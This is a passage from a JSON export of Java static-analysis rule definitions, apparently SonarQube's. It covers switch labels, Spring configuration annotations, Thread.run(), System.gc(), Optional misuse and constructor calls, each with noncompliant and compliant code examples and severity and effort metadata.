            "mdDesc": "<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing\nerror.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (day) {\n  case MONDAY:\n  case TUESDAY:\n  WEDNESDAY:   // Noncompliant; syntactically correct, but behavior is not what's expected\n    doSomething();\n    break;\n  ...\n}\n\nswitch (day) {\n  case MONDAY:\n    break;\n  case TUESDAY:\n    foo:for(int i = 0 ; i &lt; X ; i++) {  // Noncompliant; the code is correct and behaves as expected but is barely readable\n         /* ... */\n        break foo;  // this break statement doesn't relate to the nesting case TUESDAY\n         /* ... */\n    }\n    break;\n    /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (day) {\n  case MONDAY:\n  case TUESDAY:\n  case WEDNESDAY:\n    doSomething();\n    break;\n  ...\n}\n\nswitch (day) {\n  case MONDAY:\n    break;\n  case TUESDAY:\n    compute(args); // put the content of the labelled \"for\" statement in a dedicated method\n    break;\n\n    /* ... */\n}\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2309",
            "repo": "java",
            "name": "Files should not be empty",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Files with no lines of code clutter a project and should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n//package org.foo;\n//\n//public class Bar {}\n</pre>",
            "mdDesc": "<p>Files with no lines of code clutter a project and should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n//package org.foo;\n//\n//public class Bar {}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4604",
            "repo": "java",
            "name": "\"@EnableAutoConfiguration\" should be fine-tuned",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>\"@EnableAutoConfiguration\" is a convenient feature to configure the Spring Application Context by attempting to guess the beans that you are likely\nto need. The drawback is that it may load and configure beans the application will never use and therefore consume more CPU and RAM than really\nrequired. <code>@EnableAutoConfiguration</code> should be configured to exclude all the beans not required by the application. Alternatively, use the\n<code>@Import</code> annotation instead of <code>@EnableAutoConfiguration</code>, to explicitly import the useful AutoConfiguration classes.</p>\n<p>This rule applies for <code>@SpringBootApplication</code> as well.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@SpringBootApplication\npublic class MyApplication {\n...\n}\n</pre>\n<pre>\n@Configuration\n@EnableAutoConfiguration\npublic class MyApplication {\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@SpringBootApplication(exclude = {\n  MultipartAutoConfiguration.class,\n  JmxAutoConfiguration.class,\n})\npublic class MyApplication {\n...\n}\n</pre>\n<pre>\n@Configuration\n@EnableAutoConfiguration(exclude = {\n  MultipartAutoConfiguration.class,\n  JmxAutoConfiguration.class,\n})\npublic class MyApplication {\n...\n}\n</pre>\n<pre>\n@Configuration\n@Import({\n        DispatcherServletAutoConfiguration.class,\n        EmbeddedServletContainerAutoConfiguration.class,\n        ErrorMvcAutoConfiguration.class,\n        HttpEncodingAutoConfiguration.class,\n        HttpMessageConvertersAutoConfiguration.class,\n        JacksonAutoConfiguration.class,\n        ServerPropertiesAutoConfiguration.class,\n        PropertyPlaceholderAutoConfiguration.class,\n        ThymeleafAutoConfiguration.class,\n        WebMvcAutoConfiguration.class\n})\npublic class MyApplication {\n...\n}\n</pre>",
            "mdDesc": "<p>\"@EnableAutoConfiguration\" is a convenient feature to configure the Spring Application Context by attempting to guess the beans that you are likely\nto need. The drawback is that it may load and configure beans the application will never use and therefore consume more CPU and RAM than really\nrequired. <code>@EnableAutoConfiguration</code> should be configured to exclude all the beans not required by the application. Alternatively, use the\n<code>@Import</code> annotation instead of <code>@EnableAutoConfiguration</code>, to explicitly import the useful AutoConfiguration classes.</p>\n<p>This rule applies for <code>@SpringBootApplication</code> as well.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@SpringBootApplication\npublic class MyApplication {\n...\n}\n</pre>\n<pre>\n@Configuration\n@EnableAutoConfiguration\npublic class MyApplication {\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@SpringBootApplication(exclude = {\n  MultipartAutoConfiguration.class,\n  JmxAutoConfiguration.class,\n})\npublic class MyApplication {\n...\n}\n</pre>\n<pre>\n@Configuration\n@EnableAutoConfiguration(exclude = {\n  MultipartAutoConfiguration.class,\n  JmxAutoConfiguration.class,\n})\npublic class MyApplication {\n...\n}\n</pre>\n<pre>\n@Configuration\n@Import({\n        DispatcherServletAutoConfiguration.class,\n        EmbeddedServletContainerAutoConfiguration.class,\n        ErrorMvcAutoConfiguration.class,\n        HttpEncodingAutoConfiguration.class,\n        HttpMessageConvertersAutoConfiguration.class,\n        JacksonAutoConfiguration.class,\n        ServerPropertiesAutoConfiguration.class,\n        PropertyPlaceholderAutoConfiguration.class,\n        ThymeleafAutoConfiguration.class,\n        WebMvcAutoConfiguration.class\n})\npublic class MyApplication {\n...\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1217",
            "repo": "java",
            "name": "\"Thread.run()\" should not be called directly",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The purpose of the <code>Thread.run()</code> method is to execute code in a separate, dedicated thread. Calling this method directly doesn't make\nsense because it causes its code to be executed in the current thread. </p>\n<p>To get the expected behavior, call the <code>Thread.start()</code> method instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nThread myThread = new Thread(runnable);\nmyThread.run(); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nThread myThread = new Thread(runnable);\nmyThread.start(); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/572.html\">MITRE, CWE-572</a> - Call to Thread run() instead of start() </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6DdGBQ\">CERT THI00-J.</a> - Do not invoke Thread.run() </li>\n</ul>",
            "mdDesc": "<p>The purpose of the <code>Thread.run()</code> method is to execute code in a separate, dedicated thread. Calling this method directly doesn't make\nsense because it causes its code to be executed in the current thread. </p>\n<p>To get the expected behavior, call the <code>Thread.start()</code> method instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nThread myThread = new Thread(runnable);\nmyThread.run(); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nThread myThread = new Thread(runnable);\nmyThread.start(); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/572.html\">MITRE, CWE-572</a> - Call to Thread run() instead of start() </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6DdGBQ\">CERT THI00-J.</a> - Do not invoke Thread.run() </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3516",
            "repo": "java",
            "name": "Methods returns should not be invariant",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When a method is designed to return an invariant value, it may be poor design, but it shouldn't adversely affect the outcome of your program.\nHowever, when it happens on all paths through the logic, it is surely a bug.</p>\n<p>This rule raises an issue when a method contains several <code>return</code> statements that all return the same value.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint foo(int a) {\n  int b = 12;\n  if (a == 1) {\n    return b;\n  }\n  return b;  // Noncompliant\n}\n</pre>",
            "mdDesc": "<p>When a method is designed to return an invariant value, it may be poor design, but it shouldn't adversely affect the outcome of your program.\nHowever, when it happens on all paths through the logic, it is surely a bug.</p>\n<p>This rule raises an issue when a method contains several <code>return</code> statements that all return the same value.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint foo(int a) {\n  int b = 12;\n  if (a == 1) {\n    return b;\n  }\n  return b;  // Noncompliant\n}\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "LINEAR",
            "defaultDebtRemFnCoeff": "2min",
            "effortToFixDescription": "Per number of return statements",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR",
            "debtRemFnCoeff": "2min",
            "defaultRemFnType": "LINEAR",
            "defaultRemFnGapMultiplier": "2min",
            "remFnType": "LINEAR",
            "remFnGapMultiplier": "2min",
            "remFnOverloaded": false,
            "gapDescription": "Per number of return statements",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4603",
            "repo": "java",
            "name": "\"@Import\"s should be preferred to \"@ComponentScan\"s",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>@ComponentScan</code> is used to find which Spring <code>@Component</code> beans (<code>@Service</code> or <code>@Repository</code> or\n<code>Controller</code>) are available in the classpath so they can be used in the application context. This is a convenient feature especially when\nyou begin a new project but it comes with the drawback of slowing down the application start-up time especially when the application becomes bigger\n(ie: it references a large JAR file, or it references a significant number of JAR files, or the base-package refers to a large amount of .class\nfiles).</p>\n<p><code>@ComponentScan</code> should be replaced by an explicit list of Spring beans loaded by <code>@Import</code>.</p>\n<p>The interface <code>@SpringBootApplication</code> is also considered by this rule because it is annotated with <code>@ComponentScan</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@ComponentScan\npublic class MyApplication {\n...\n}\n\n@SpringBootApplication\npublic class MyApplication {\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Configuration\n@Import({\n        DispatcherServletAutoConfiguration.class,\n        ErrorMvcAutoConfiguration.class,\n        HttpEncodingAutoConfiguration.class,\n        HttpMessageConvertersAutoConfiguration.class,\n        MultipartAutoConfiguration.class,\n        ServerPropertiesAutoConfiguration.class,\n        PropertyPlaceholderAutoConfiguration.class,\n        WebMvcAutoConfiguration.class\n})\npublic class MyApplication {\n...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://sites.google.com/site/appsdevelopersindia/google-blog/optimizingspringframeworkforappengineapplications\">Optimizing Spring\n  Framework for App Engine Applications</a> </li>\n</ul>",
            "mdDesc": "<p><code>@ComponentScan</code> is used to find which Spring <code>@Component</code> beans (<code>@Service</code> or <code>@Repository</code> or\n<code>Controller</code>) are available in the classpath so they can be used in the application context. This is a convenient feature especially when\nyou begin a new project but it comes with the drawback of slowing down the application start-up time especially when the application becomes bigger\n(ie: it references a large JAR file, or it references a significant number of JAR files, or the base-package refers to a large amount of .class\nfiles).</p>\n<p><code>@ComponentScan</code> should be replaced by an explicit list of Spring beans loaded by <code>@Import</code>.</p>\n<p>The interface <code>@SpringBootApplication</code> is also considered by this rule because it is annotated with <code>@ComponentScan</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@ComponentScan\npublic class MyApplication {\n...\n}\n\n@SpringBootApplication\npublic class MyApplication {\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Configuration\n@Import({\n        DispatcherServletAutoConfiguration.class,\n        ErrorMvcAutoConfiguration.class,\n        HttpEncodingAutoConfiguration.class,\n        HttpMessageConvertersAutoConfiguration.class,\n        MultipartAutoConfiguration.class,\n        ServerPropertiesAutoConfiguration.class,\n        PropertyPlaceholderAutoConfiguration.class,\n        WebMvcAutoConfiguration.class\n})\npublic class MyApplication {\n...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://sites.google.com/site/appsdevelopersindia/google-blog/optimizingspringframeworkforappengineapplications\">Optimizing Spring\n  Framework for App Engine Applications</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4605",
            "repo": "java",
            "name": "Spring beans should be considered by \"@ComponentScan\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Spring beans belonging to packages that are not included in a <code>@ComponentScan</code> configuration will not be accessible in the Spring\nApplication Context. Therefore, it's likely to be a configuration mistake that will be detected by this rule. <strong>Note:</strong> the\n<code>@ComponentScan</code> is implicit in the <code>@SpringBootApplication</code> annotation, case in which Spring Boot will auto scan for components\nin the package containing the Spring Boot main class and its sub-packages.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Configuration\n@ComponentScan(\"com.mycompany.app.beans\")\npublic class Application {\n...\n}\n\npackage com.mycompany.app.web;\n\n@Controller\npublic class MyController { // Noncompliant; MyController belong to \"com.mycompany.app.web\" while the ComponentScan is looking for beans in \"com.mycompany.app.beans\" package\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Configuration\n@ComponentScan({\"com.mycompany.app.beans\",\"com.mycompany.app.web\"})\npublic class Application {\n...\n}\n\npackage com.mycompany.app.web;\n\n@Controller\npublic class MyController { // Compliant; \"com.mycompany.app.web\" is referenced by a @ComponentScan annotated class\n...\n}\n</pre>",
            "mdDesc": "<p>Spring beans belonging to packages that are not included in a <code>@ComponentScan</code> configuration will not be accessible in the Spring\nApplication Context. Therefore, it's likely to be a configuration mistake that will be detected by this rule. <strong>Note:</strong> the\n<code>@ComponentScan</code> is implicit in the <code>@SpringBootApplication</code> annotation, case in which Spring Boot will auto scan for components\nin the package containing the Spring Boot main class and its sub-packages.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Configuration\n@ComponentScan(\"com.mycompany.app.beans\")\npublic class Application {\n...\n}\n\npackage com.mycompany.app.web;\n\n@Controller\npublic class MyController { // Noncompliant; MyController belong to \"com.mycompany.app.web\" while the ComponentScan is looking for beans in \"com.mycompany.app.beans\" package\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Configuration\n@ComponentScan({\"com.mycompany.app.beans\",\"com.mycompany.app.web\"})\npublic class Application {\n...\n}\n\npackage com.mycompany.app.web;\n\n@Controller\npublic class MyController { // Compliant; \"com.mycompany.app.web\" is referenced by a @ComponentScan annotated class\n...\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1215",
            "repo": "java",
            "name": "Execution of the Garbage Collector should be triggered only by the JVM",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Calling <code>System.gc()</code> or <code>Runtime.getRuntime().gc()</code> is a bad idea for a simple reason: there is no way to know exactly what\nwill be done under the hood by the JVM because the behavior will depend on its vendor, version and options:</p>\n<ul>\n  <li> Will the whole application be frozen during the call? </li>\n  <li> Is the <code>-XX:DisableExplicitGC</code> option activated? </li>\n  <li> Will the JVM simply ignore the call? </li>\n  <li> ... </li>\n</ul>\n<p>Like for <code>System.gc()</code>, there is no reason to manually call <code>runFinalization()</code> to force the call of finalization methods of\nany objects pending finalization.</p>\n<p>An application relying on these unpredictable methods is also unpredictable and therefore broken. The task of running the garbage collector and\ncalling <code>finalize()</code> methods should be left exclusively to the JVM.</p>",
            "mdDesc": "<p>Calling <code>System.gc()</code> or <code>Runtime.getRuntime().gc()</code> is a bad idea for a simple reason: there is no way to know exactly what\nwill be done under the hood by the JVM because the behavior will depend on its vendor, version and options:</p>\n<ul>\n  <li> Will the whole application be frozen during the call? </li>\n  <li> Is the <code>-XX:DisableExplicitGC</code> option activated? </li>\n  <li> Will the JVM simply ignore the call? </li>\n  <li> ... </li>\n</ul>\n<p>Like for <code>System.gc()</code>, there is no reason to manually call <code>runFinalization()</code> to force the call of finalization methods of\nany objects pending finalization.</p>\n<p>An application relying on these unpredictable methods is also unpredictable and therefore broken. The task of running the garbage collector and\ncalling <code>finalize()</code> methods should be left exclusively to the JVM.</p>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice",
                "unpredictable"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2789",
            "repo": "java",
            "name": "\"null\" should not be used with \"Optional\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The concept of <code>Optional</code> is that it will be used when <code>null</code> could cause errors. In a way, it replaces <code>null</code>,\nand when <code>Optional</code> is in use, there should never be a question of returning or receiving <code>null</code> from a call.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething () {\n  Optional&lt;String&gt; optional = getOptional();\n  if (optional != null) {  // Noncompliant\n    // do something with optional...\n  }\n  Optional&lt;String&gt; text = null; // Noncompliant, a variable whose type is Optional should never itself be null\n  // ...\n}\n\n@Nullable // Noncompliant\npublic Optional&lt;String&gt; getOptional() {\n  // ...\n  return null;  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething () {\n  Optional&lt;String&gt; optional = getOptional();\n  optional.ifPresent(\n    // do something with optional...\n  );\n  Optional&lt;String&gt; text = Optional.empty();\n  // ...\n}\n\npublic Optional&lt;String&gt; getOptional() {\n  // ...\n  return Optional.empty();\n}\n</pre>",
            "mdDesc": "<p>The concept of <code>Optional</code> is that it will be used when <code>null</code> could cause errors. In a way, it replaces <code>null</code>,\nand when <code>Optional</code> is in use, there should never be a question of returning or receiving <code>null</code> from a call.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething () {\n  Optional&lt;String&gt; optional = getOptional();\n  if (optional != null) {  // Noncompliant\n    // do something with optional...\n  }\n  Optional&lt;String&gt; text = null; // Noncompliant, a variable whose type is Optional should never itself be null\n  // ...\n}\n\n@Nullable // Noncompliant\npublic Optional&lt;String&gt; getOptional() {\n  // ...\n  return null;  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething () {\n  Optional&lt;String&gt; optional = getOptional();\n  optional.ifPresent(\n    // do something with optional...\n  );\n  Optional&lt;String&gt; text = Optional.empty();\n  // ...\n}\n\npublic Optional&lt;String&gt; getOptional() {\n  // ...\n  return Optional.empty();\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1699",
            "repo": "java",
            "name": "Constructors should only call non-overridable methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Calling an overridable method from a constructor could result in failures or strange behaviors when instantiating a subclass which overrides the\nmethod.</p>\n<p>For example:</p>\n<ul>\n  <li> The subclass class constructor starts by contract by calling the parent class constructor. </li>\n  <li> The parent class constructor calls the method, which has been overridden in the child class. </li>\n  <li> If the behavior of the child class method depends on fields that are initialized in the child class constructor, unexpected behavior (like a\n  <code>NullPointerException</code>) can result, because the fields aren't initialized yet. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Parent {\n\n  public Parent () {\n    doSomething();  // Noncompliant\n  }\n\n  public void doSomething () {  // not final; can be overridden\n    ...\n  }\n}\n\npublic class Child extends Parent {\n\n  private String foo;\n\n  public Child(String foo) {\n    super(); // leads to call doSomething() in Parent constructor which triggers a NullPointerException as foo has not yet been initialized\n    this.foo = foo;\n  }\n\n  public void doSomething () {\n    System.out.println(this.foo.length());\n  }\n\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/8zZGBQ\">CERT, MET05-J.</a> - Ensure that constructors do not call overridable methods </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6ns-BQ\">CERT, OOP50-CPP.</a> - Do not invoke virtual functions from constructors or destructors\n  </li>\n</ul>",
            "mdDesc": "<p>Calling an overridable method from a constructor could result in failures or strange behaviors when instantiating a subclass which overrides the\nmethod.</p>\n<p>For example:</p>\n<ul>\n  <li> The subclass class constructor starts by contract by calling the parent class constructor. </li>\n  <li> The parent class constructor calls the method, which has been overridden in the child class. </li>\n  <li> If the behavior of the child class method depends on fields that are initialized in the child class constructor, unexpected behavior (like a\n  <code>NullPointerException</code>) can result, because the fields aren't initialized yet. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Parent {\n\n  public Parent () {\n    doSomething();  // Noncompliant\n  }\n\n  public void doSomething () {  // not final; can be overridden\n    ...\n  }\n}\n\npublic class Child extends Parent {\n\n  private String foo;\n\n  public Child(String foo) {\n    super(); // leads to call doSomething() in Parent constructor which triggers a NullPointerException as foo has not yet been initialized\n    this.foo = foo;\n  }\n\n  public void doSomething () {\n    System.out.println(this.foo.length());\n  }\n\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/8zZGBQ\">CERT, MET05-J.</a> - Ensure that constructors do not call overridable methods </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6ns-BQ\">CERT, OOP50-CPP.</a> - Do not invoke virtual functions from constructors or destructors\n  </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3878",
            "repo": "java",
            "name": "Arrays should not be created for varargs parameters",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There's no point in creating an array solely for the purpose of passing it as a varargs (<code>...</code>) argument; varargs <em>is</em> an array.\nSimply pass the elements directly. They will be consolidated into an array automatically. Incidentally passing an array where <code>Object ...</code>\nis expected makes the intent ambiguous: Is the array supposed to be one object or a collection of objects?</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void callTheThing() {\n  //...\n  doTheThing(new String[] { \"s1\", \"s2\"});  // Noncompliant: unnecessary\n  doTheThing(new String[12]);  // Compliant\n  doTheOtherThing(new String[8]);  // Noncompliant: ambiguous\n  // ...\n}\n\npublic void doTheThing (String ... args) {\n  // ...\n}\n\npublic void doTheOtherThing(Object ... args) {\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void callTheThing() {\n  //...\n  doTheThing(\"s1\", \"s2\");\n  doTheThing(new String[12]);\n  doTheOtherThing((Object[]) new String[8]);\n   // ...\n}\n\npublic void doTheThing (String ... args) {\n  // ...\n}\n\npublic void doTheOtherThing(Object ... args) {\n  // ...\n}\n</pre>",
            "mdDesc": "<p>There's no point in creating an array solely for the purpose of passing it as a varargs (<code>...</code>) argument; varargs <em>is</em> an array.\nSimply pass the elements directly. They will be consolidated into an array automatically. Incidentally passing an array where <code>Object ...</code>\nis expected makes the intent ambiguous: Is the array supposed to be one object or a collection of objects?</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void callTheThing() {\n  //...\n  doTheThing(new String[] { \"s1\", \"s2\"});  // Noncompliant: unnecessary\n  doTheThing(new String[12]);  // Compliant\n  doTheOtherThing(new String[8]);  // Noncompliant: ambiguous\n  // ...\n}\n\npublic void doTheThing (String ... args) {\n  // ...\n}\n\npublic void doTheOtherThing(Object ... args) {\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void callTheThing() {\n  //...\n  doTheThing(\"s1\", \"s2\");\n  doTheThing(new String[12]);\n  doTheOtherThing((Object[]) new String[8]);\n   // ...\n}\n\npublic void doTheThing (String ... args) {\n  // ...\n}\n\npublic void doTheOtherThing(Object ... args) {\n  // ...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1104",
            "repo": "java",
            "name": "Class variable fields should not have public accessibility",
            "createdAt": "2022-09-26T07:32:37+0000",
